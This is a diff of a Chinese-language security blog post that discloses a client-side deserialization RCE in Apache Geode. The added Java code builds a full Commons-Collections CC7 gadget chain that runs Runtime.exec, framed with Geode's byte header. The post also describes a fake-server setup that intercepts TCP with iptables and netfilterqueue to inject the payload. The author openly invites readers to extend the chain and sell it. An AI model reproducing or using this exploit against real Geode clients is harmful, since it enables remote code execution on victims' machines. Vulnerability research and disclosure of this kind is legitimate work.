@@ -5,7 +5,7 @@ published: true
 
 这段时间笔者审计在此之前遇到的一个 Apache 中间件 Apache Geode，并且会在这里实时开源自己新鲜审计出来的漏洞链 和 已经审计出来的 RCE 漏洞，供读者学习  
 
-如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系(反正咱也不缺这一个)，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi). 审不出来也没关系哦，至少能学习到最优秀的程序员 coding 风格
+如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系(反正咱也不缺这一个)，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi). 笔者如果实在审不出来也没关系，至少能学习到最优秀的程序员 coding 风格  
 
 注意，本篇文章不遵循 CC4 协议，其内容均为 leeya_bug 所有，禁止转载
 
@@ -14,9 +14,9 @@ published: true
     当前由 leeya_bug 发现的 Apache Geode 漏洞
   </td></tr>
   <tr><td>
-    AGVL-01: Apache Geode 客户端反序列化RCE漏洞
+    AGVL-01: Apache Geode 客户端反序列化 RCE 漏洞
   </td><td>
-    由于客户端不正确地接收了来自服务端的数据流并将其误静态判断后反序列化，若攻击者伪造服务端/中间人攻击，将触发该反序列化漏洞
+    由于客户端不正确地接收了来自服务端的数据流并将其误静态判断后反序列化，若攻击者伪造服务端/中间人攻击，将触发该反序列化漏洞并 RCE
   </td></tr>
 </table>
 <!--
@@ -179,21 +179,65 @@ public abstract class InternalDataSerializer extends DataSerializer {
 
 ```
 接下来构造 Payload  
-Payload 就很简单了，构造流程只需要将 ObjectInputStream.writeObject 后的反序列化链字节流前置一个 44 字节即可，Payload 为 `b',\xac\xed\x00\x05sr\x00\x11org.example.HACK2\xcb\xa8s\x8d\xc3mwj\x02\x00\x00xp'`，构造流程不在此演示  
-这里读者的 Payload 为自行在本地写的一个名为 HACK2 的类，懒得写个反序列化链了，若有想打入反序列化链的读者请自行尝试  
+Payload 就很简单了，构造流程只需要将 ObjectInputStream.writeObject 后的反序列化链字节流前置一个 44 字节即可  
+这里读者借用了 CC7 链来充当反序列化链，有需要的读者可以自己构造链子  
 
 ```java
 //Payload
-package org.example;
-
-import java.io.IOException;
-import java.util.Base64;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.geode.cache.Region;
+import org.apache.geode.cache.client.*;
 import org.apache.geode.internal.cache.tier.sockets.CacheServerHelper;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.*;
 
-public class Payload1 {
-    public Payload1() throws IOException, ClassNotFoundException {
-        byte[] payload = Base64.getDecoder().decode("LKztAAVzcgARb3JnLmV4YW1wbGUuSEFDSzLLqHONw213agIAAHhw");
-        CacheServerHelper.deserialize(payload);
+public class Geode {
+
+    public Object CC7() throws NoSuchFieldException, IllegalAccessException {
+        //构造 CC7 链并返回
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
+        Map<Object, Object> map1 = new HashMap<>();
+        Map<Object, Object> map2 = new HashMap<>();
+        Map<Object, Object> lazymap1 = LazyMap.decorate(map1, chainedTransformer);
+        Map<Object, Object> lazymap2 = LazyMap.decorate(map2, chainedTransformer);
+        lazymap1.put("yy", 1);
+        lazymap2.put("zZ",1);
+        Hashtable hashtable = new Hashtable<>();
+        hashtable.put(lazymap1, 1);
+        hashtable.put(lazymap2,2);
+        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer, transformers);
+        lazymap2.remove("yy");
+        return hashtable;
+    }
+
+    public Geode() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+        //构造 Payload
+        ByteArrayOutputStream by = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(by);
+        oos.writeObject(CC7());
+        byte[] code1 = by.toByteArray();
+
+        byte[] code3 = new byte[code1.length + 4];
+        for (int i = 0; i < code1.length; i++) {
+            code3[i + 1] = code1[i];
+        }
+        code3[0] = 44;
+        code3[code3.length - 1] = 1;
+        code3[code3.length - 2] = 42;
+        code3[code3.length - 3] = -23;
+
+        CacheServerHelper.deserialize(code3);
     }
 }
 ```
@@ -203,7 +247,7 @@ public class Payload1 {
 
 在漏洞链2的构造过程中需要连接服务器并动态调试，因此笔者使用了IP为 172.245.82.84 的笔者合法购买的服务器，谁想打谁打吧反正就一个22端口
 
-在 172.245.82.84 装上 jdk1.8 运行 gfsh 命令终端后，输入以下几行命令启动 Geode 服务端并且初始化 locator、server、region
+在 172.245.82.84 装上 jdk1.8 运行 gfsh 命令终端后，输入以下几行命令 bind ip 并启动 Geode 服务端并且初始化 locator、server、region
 
 ```bash
 start locator --bind-address=172.245.82.84
@@ -262,8 +306,7 @@ public class Main {
 # [](#header-31)漏洞agvl-01:
 # [](#header-31)Apache Geode 客户端反序列化RCE漏洞(基于漏洞链2)
 
-接下来笔者需要做的事情就是构造一个伪服务端，拦截发送到客户端的 TCP 流量后观察其 Data 头部是否为 015C04AC，若是，则将 Data 替换为漏洞链1的 Payload  
-`b',\xac\xed\x00\x05sr\x00\x11org.example.HACK2\xcb\xa8s\x8d\xc3mwj\x02\x00\x00xp'`  
+接下来笔者需要做的事情就是构造一个伪服务端，拦截发送到客户端的 TCP 流量后观察其 Data 头部是否为 015C04AC，若是，则将 Data 替换为漏洞链1的基于 CC7 链的 Payload  
 上面这段话看似简单，实际上要实现并非简单. 基于 TCP 协议的 Geode 协议并非类似于应用层 HTTP(s) 这种协议，想拦就拦想改就改. 按照以往流程，笔者需要在 Linux 服务器上写个 hook 函数直接拦截 TCP 流量并观察其内容  
 
 不过笔者又不想写 hook，只能找到了一个 Scapy + netfilterqueue 已经替用户封装好了的替代方案，通过 iptables 重定向流量导入 netfilterqueue 后再编写 Python 代码从 netfilterqueue 中抓取 TCP 流量
@@ -277,7 +320,7 @@ yum install libnfnetlink-devel
 yum install libnetfilter_queue-devel
 ```
 
-更改 iptables，如下所示
+更改 iptables，如下所示. 请注意，这里一定要将机器接显或者使用云厂商 VNC 连接！
 
 ```bash
 #更改 iptables 配置
@@ -339,4 +382,4 @@ queue.run()
 笔者对开发者的一些建议：  
 
 1. 希望 Apache Geode 在网络数据交互方面能有更多的优化和测试
-2. 如<!--果一个开发者只是对于软件架构理解地好，对于网络编程几乎0掌握，那我建议他千万千万别来搞 Web 开发，千万别来写中间件，自己开发的东西为什么没什么人用自己没有点b数吗？-->
+2. 如<!--果一个开发者只是对于软件架构有深入地理解，而对于网络编程几乎一窍不通，那我建议他千万千万别来搞 Web 开发，千万别来写中间件，自己开发的东西为什么没什么人用自己没有点b数吗？-->
